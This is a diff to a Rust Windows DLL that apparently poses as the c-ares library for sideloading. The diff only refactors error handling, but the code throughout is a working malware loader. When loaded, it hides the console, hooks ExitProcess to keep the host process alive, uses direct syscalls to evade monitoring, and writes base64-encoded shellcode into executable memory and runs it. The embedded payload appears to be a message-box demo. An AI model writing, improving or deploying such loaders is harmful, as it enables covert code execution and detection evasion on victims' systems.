@@ -437,149 +437,159 @@ export_function!(ares_tolower);
 export_function!(ares_version);
 
 unsafe fn hook_exit_process() {
-    let _ntdll_base = get_module_base("ntdll.dll").unwrap();
-    let kernel32_base = get_module_base("kernel32.dll").unwrap();
+    if let (Some(kernel32_base), Some(nt_protect_id), Some(nt_write_id)) = (
+        get_module_base("kernel32.dll"),
+        get_syscall_number("NtProtectVirtualMemory"),
+        get_syscall_number("NtWriteVirtualMemory"),
+    ) {
+        if let Some(exit_proc_addr) = get_export_address(kernel32_base, "ExitProcess") {
+            let exit_proc_ptr = exit_proc_addr as *mut u8;
+            ORIGINAL_EXIT_PROCESS = exit_proc_ptr as usize;
 
-    let exit_proc_addr = get_export_address(kernel32_base, "ExitProcess").unwrap() as *mut u8;
+            let mut base_address = exit_proc_ptr as *mut std::ffi::c_void;
+            let mut region_size = 12usize;
+            let mut old_protect = 0u32;
 
-    ORIGINAL_EXIT_PROCESS = exit_proc_addr as usize;
+            asm_nt_protect_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut base_address,
+                &mut region_size,
+                windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
+                &mut old_protect,
+                nt_protect_id,
+            );
 
-    let mut base_address = exit_proc_addr as *mut std::ffi::c_void;
-    let mut region_size = 12usize;
-    let mut old_protect = 0u32;
+            let hook_addr = fake_exit_process as usize;
+            let patch: [u8; 12] = [
+                0x48, 0xB8,
+                (hook_addr & 0xFF) as u8,
+                ((hook_addr >> 8) & 0xFF) as u8,
+                ((hook_addr >> 16) & 0xFF) as u8,
+                ((hook_addr >> 24) & 0xFF) as u8,
+                ((hook_addr >> 32) & 0xFF) as u8,
+                ((hook_addr >> 40) & 0xFF) as u8,
+                ((hook_addr >> 48) & 0xFF) as u8,
+                ((hook_addr >> 56) & 0xFF) as u8,
+                0xFF, 0xE0,
+            ];
 
-    let nt_protect_id = get_syscall_number("NtProtectVirtualMemory").unwrap();
-    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();
+            let mut bytes_written = 0usize;
+            asm_nt_write_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                exit_proc_ptr as *mut std::ffi::c_void,
+                patch.as_ptr() as *const std::ffi::c_void,
+                patch.len(),
+                &mut bytes_written,
+                nt_write_id,
+            );
 
-    asm_nt_protect_virtual_memory(
-        -1isize as windows_sys::Win32::Foundation::HANDLE,
-        &mut base_address,
-        &mut region_size,
-        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
-        &mut old_protect,
-        nt_protect_id,
-    );
-
-    let hook_addr = fake_exit_process as usize;
-
-    let patch: [u8; 12] = [
-        0x48, 0xB8,
-        (hook_addr & 0xFF) as u8,
-        ((hook_addr >> 8) & 0xFF) as u8,
-        ((hook_addr >> 16) & 0xFF) as u8,
-        ((hook_addr >> 24) & 0xFF) as u8,
-        ((hook_addr >> 32) & 0xFF) as u8,
-        ((hook_addr >> 40) & 0xFF) as u8,
-        ((hook_addr >> 48) & 0xFF) as u8,
-        ((hook_addr >> 56) & 0xFF) as u8,
-        0xFF, 0xE0,
-    ];
-
-    let mut bytes_written = 0usize;
-    asm_nt_write_virtual_memory(
-        -1isize as windows_sys::Win32::Foundation::HANDLE,
-        exit_proc_addr as *mut std::ffi::c_void,
-        patch.as_ptr() as *const std::ffi::c_void,
-        patch.len(),
-        &mut bytes_written,
-        nt_write_id,
-    );
-
-    asm_nt_protect_virtual_memory(
-        -1isize as windows_sys::Win32::Foundation::HANDLE,
-        &mut base_address,
-        &mut region_size,
-        old_protect,
-        &mut old_protect,
-        nt_protect_id,
-    );
+            asm_nt_protect_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut base_address,
+                &mut region_size,
+                old_protect,
+                &mut old_protect,
+                nt_protect_id,
+            );
+        }
+    }
 }
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
-    let nt_create_event_id = get_syscall_number("NtCreateEvent").unwrap();
-    let nt_wait_id = get_syscall_number("NtWaitForSingleObject").unwrap();
+    if let (Some(nt_create_event_id), Some(nt_wait_id)) = (
+        get_syscall_number("NtCreateEvent"),
+        get_syscall_number("NtWaitForSingleObject"),
+    ) {
+        let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+        asm_nt_create_event(
+            &mut event_handle,
+            0x1F0003, // EVENT_ALL_ACCESS
+            std::ptr::null_mut(),
+            1, // NotificationEvent
+            0, // Not signaled
+            nt_create_event_id,
+        );
 
-    let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
-    asm_nt_create_event(
-        &mut event_handle,
-        0x1F0003, // EVENT_ALL_ACCESS
-        std::ptr::null_mut(),
-        1, // NotificationEvent
-        0, // Not signaled
-        nt_create_event_id,
-    );
-
-    asm_nt_wait_for_single_object(
-        event_handle,
-        0,
-        std::ptr::null_mut(), // INFINITE
-        nt_wait_id,
-    );
+        if event_handle != 0 {
+            asm_nt_wait_for_single_object(
+                event_handle,
+                0,
+                std::ptr::null_mut(), // INFINITE
+                nt_wait_id,
+            );
+        }
+    }
+    // Fallback: spin loop to prevent exit if syscalls fail
+    loop { std::thread::sleep(std::time::Duration::from_secs(60)); }
 }
 
 const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";
 
 unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
-    let shellcode = general_purpose::STANDARD.decode(ENCODED_SHELLCODE).unwrap();
+    if let Ok(shellcode) = general_purpose::STANDARD.decode(ENCODED_SHELLCODE) {
+        if let (Some(nt_alloc_id), Some(nt_write_id)) = (
+            get_syscall_number("NtAllocateVirtualMemory"),
+            get_syscall_number("NtWriteVirtualMemory"),
+        ) {
+            let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
+            let mut region_size = shellcode.len();
 
-    let mut exec_mem: *mut std::ffi::c_void = std::ptr::null_mut();
-    let mut region_size = shellcode.len();
+            let status = asm_nt_allocate_virtual_memory(
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                &mut exec_mem,
+                0,
+                &mut region_size,
+                0x3000, // MEM_COMMIT | MEM_RESERVE
+                0x40,   // PAGE_EXECUTE_READWRITE
+                nt_alloc_id,
+            );
 
-    let nt_alloc_id = get_syscall_number("NtAllocateVirtualMemory").unwrap();
-    let nt_write_id = get_syscall_number("NtWriteVirtualMemory").unwrap();
+            if status == 0 && !exec_mem.is_null() {
+                let mut bytes_written = 0usize;
+                asm_nt_write_virtual_memory(
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    exec_mem,
+                    shellcode.as_ptr() as *const std::ffi::c_void,
+                    shellcode.len(),
+                    &mut bytes_written,
+                    nt_write_id,
+                );
 
-    let status = asm_nt_allocate_virtual_memory(
-        -1isize as windows_sys::Win32::Foundation::HANDLE,
-        &mut exec_mem,
-        0,
-        &mut region_size,
-        windows_sys::Win32::System::Memory::MEM_COMMIT | windows_sys::Win32::System::Memory::MEM_RESERVE,
-        windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
-        nt_alloc_id,
-    );
-
-    if status == 0 && !exec_mem.is_null() {
-        let mut bytes_written = 0usize;
-        asm_nt_write_virtual_memory(
-            -1isize as windows_sys::Win32::Foundation::HANDLE,
-            exec_mem,
-            shellcode.as_ptr() as *const std::ffi::c_void,
-            shellcode.len(),
-            &mut bytes_written,
-            nt_write_id,
-        );
-
-        let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
-        exec_fn();
+                let exec_fn: extern "system" fn() = std::mem::transmute(exec_mem);
+                exec_fn();
+            }
+        }
     }
     0
 }
 
 unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
-    let kernel32_base = get_module_base("kernel32.dll").unwrap();
-    let create_process_addr = get_export_address(kernel32_base, "CreateProcessA").unwrap();
-    let create_process: extern "system" fn(
-        PCSTR, PSTR, *const (), *const (), bool, u32, *const (), PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION
-    ) -> BOOL = std::mem::transmute(create_process_addr);
+    if let Some(kernel32_base) = get_module_base("kernel32.dll") {
+        if let Some(create_process_addr) = get_export_address(kernel32_base, "CreateProcessA") {
+            let create_process: extern "system" fn(
+                PCSTR, PSTR, *const (), *const (), bool, u32, *const (), PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION
+            ) -> BOOL = std::mem::transmute(create_process_addr);
 
-    let mut si = STARTUPINFOA::default();
-    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
+            let mut si = STARTUPINFOA::default();
+            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
 
-    let mut pi = PROCESS_INFORMATION::default();
-    let mut cmd = b"notepad.exe\0".to_vec();
+            let mut pi = PROCESS_INFORMATION::default();
+            let mut cmd = b"notepad.exe\0".to_vec();
 
-    let _ = create_process(
-        PCSTR::null(),
-        PSTR(cmd.as_mut_ptr()),
-        std::ptr::null(),
-        std::ptr::null(),
-        false,
-        CREATE_NO_WINDOW.0,
-        std::ptr::null(),
-        PCSTR::null(),
-        &si,
-        &mut pi,
-    );
+            let _ = create_process(
+                PCSTR::null(),
+                PSTR(cmd.as_mut_ptr()),
+                std::ptr::null(),
+                std::ptr::null(),
+                false,
+                CREATE_NO_WINDOW.0,
+                std::ptr::null(),
+                PCSTR::null(),
+                &si,
+                &mut pi,
+            );
+        }
+    }
     0
 }
 
@@ -591,33 +601,38 @@ pub extern "system" fn DllMain(
 ) -> BOOL {
     if fdw_reason == DLL_PROCESS_ATTACH {
         unsafe {
-            let user32_base = get_module_base("user32.dll").unwrap();
-            let show_window_addr = get_export_address(user32_base, "ShowWindow").unwrap();
-            let show_window: extern "system" fn(windows::Win32::Foundation::HWND, u32) -> BOOL = std::mem::transmute(show_window_addr);
-
-            let kernel32_base = get_module_base("kernel32.dll").unwrap();
-            let get_console_window_addr = get_export_address(kernel32_base, "GetConsoleWindow").unwrap();
-            let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
-
-            let hwnd = get_console_window();
-            show_window(hwnd, 0); // SW_HIDE = 0
+            if let Some(user32_base) = get_module_base("user32.dll") {
+                if let Some(show_window_addr) = get_export_address(user32_base, "ShowWindow") {
+                    let show_window: extern "system" fn(windows::Win32::Foundation::HWND, u32) -> BOOL = std::mem::transmute(show_window_addr);
+                    if let Some(kernel32_base) = get_module_base("kernel32.dll") {
+                        if let Some(get_console_window_addr) = get_export_address(kernel32_base, "GetConsoleWindow") {
+                            let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
+                            let hwnd = get_console_window();
+                            if hwnd.0 != 0 {
+                                show_window(hwnd, 0); // SW_HIDE
+                            }
+                        }
+                    }
+                }
+            }
 
             hook_exit_process();
 
-            let nt_create_thread_id = get_syscall_number("NtCreateThreadEx").unwrap();
-            let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+            if let Some(nt_create_thread_id) = get_syscall_number("NtCreateThreadEx") {
+                let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
 
-            asm_nt_create_thread_ex(
-                &mut thread_handle,
-                0x1FFFFF, // THREAD_ALL_ACCESS
-                std::ptr::null_mut(),
-                -1isize as windows_sys::Win32::Foundation::HANDLE,
-                shellcode_thread as *mut std::ffi::c_void,
-                std::ptr::null_mut(),
-                0, 0, 0, 0,
-                std::ptr::null_mut(),
-                nt_create_thread_id,
-            );
+                asm_nt_create_thread_ex(
+                    &mut thread_handle,
+                    0x1FFFFF, // THREAD_ALL_ACCESS
+                    std::ptr::null_mut(),
+                    -1isize as windows_sys::Win32::Foundation::HANDLE,
+                    shellcode_thread as *mut std::ffi::c_void,
+                    std::ptr::null_mut(),
+                    0, 0, 0, 0,
+                    std::ptr::null_mut(),
+                    nt_create_thread_id,
+                );
+            }
         }
     }
     BOOL(1)
